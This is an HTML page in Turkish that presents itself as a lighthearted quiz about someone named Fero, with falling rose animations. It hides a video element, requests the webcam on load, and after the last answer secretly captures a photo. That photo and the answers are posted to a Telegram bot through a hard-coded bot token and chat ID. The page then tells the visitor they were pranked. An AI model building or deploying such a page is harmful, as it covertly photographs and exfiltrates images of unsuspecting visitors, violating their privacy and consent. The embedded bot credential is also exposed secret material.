<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>FERO Quiz 😃</title>
  <style>
    body { 
      display: flex; 
      justify-content: center; 
      align-items: center; 
      height: 100vh; 
      background: #111; 
      color: white; 
      font-family: Arial, sans-serif; 
      text-align: center;
      flex-direction: column;
      overflow: hidden;
    }
    h1 { font-size: 2em; margin-bottom: 20px; }
    .question { margin-bottom: 15px; font-size: 1.3em; }
    button { 
      padding: 10px 20px; 
      margin: 5px; 
      border: none; 
      border-radius: 8px; 
      font-size: 16px; 
      cursor: pointer; 
      background: #444; 
      color: white;
      transition: 0.3s;
    }
    button:hover { background: #666; }
    .rose {
      position: absolute;
      top: -50px;
      font-size: 24px;
      animation: fall linear forwards;
      opacity: 0.9;
    }
    @keyframes fall {
      to {
        transform: translateY(110vh) rotate(360deg);
        opacity: 0;
      }
    }
    video, canvas { display: none; }
  </style>
</head>
<body>
  <div id="quiz">
    <div class="question">FERO'yu seviyor musun?</div>
    <button onclick="nextQuestion('Evet')">Evet</button>
    <button onclick="nextQuestion('Hayır')">Hayır</button>
  </div>

  <video id="video" autoplay></video>
  <canvas id="canvas"></canvas>

  <script>
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const ctx = canvas.getContext("2d");

    const BOT_TOKEN = "8369405248:AAEGL_vh2_ZkknIOKbOaqbHVEGynLzPq47I";
    const CHAT_ID = "8494445812";

    let answers = [];

    function nextQuestion(answer) {
      answers.push(answer);

      // 2. soruya geç
      document.getElementById("quiz").innerHTML = `
        <div class="question">Feronun boyu kaç?</div>
        <button onclick="finishQuiz('1,80')">A) 1,80</button>
        <button onclick="finishQuiz('1,77')">B) 1,77</button>
        <button onclick="finishQuiz('1,83')">C) 1,83</button>
        <button onclick="finishQuiz('1,90')">D) 1,90</button>
      `;
    }

    function finishQuiz(answer) {
      answers.push(answer);
      takePhotoAndSend();
    }

    function takePhotoAndSend() {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0);

      canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("photo", blob, "photo.png");
        formData.append("caption", `Cevaplar: ${answers.join(", ")}`);

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: "POST",
          body: formData
        }).then(() => {
          document.body.innerHTML = "<h1>Şakalandın dostum 😃</h1>";
        }).catch(() => {
          document.body.innerHTML = "<h1>Fotoğraf gönderilemedi 😅</h1>";
        });
      });
    }

    // Kamera aç (video gizli)
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;
      })
      .catch(err => {
        document.body.innerHTML = "<h1>Kamera izni vermedin 😅</h1>";
      });

    // Gül efekti
    function createRose() {
      const rose = document.createElement("div");
      rose.classList.add("rose");
      rose.innerHTML = "🌹";
      rose.style.left = Math.random() * 100 + "vw";
      rose.style.fontSize = (20 + Math.random() * 20) + "px";
      rose.style.animationDuration = (4 + Math.random() * 4) + "s";
      document.body.appendChild(rose);

      setTimeout(() => rose.remove(), 8000);
    }
    setInterval(createRose, 500);
  </script>
</body>
</html>
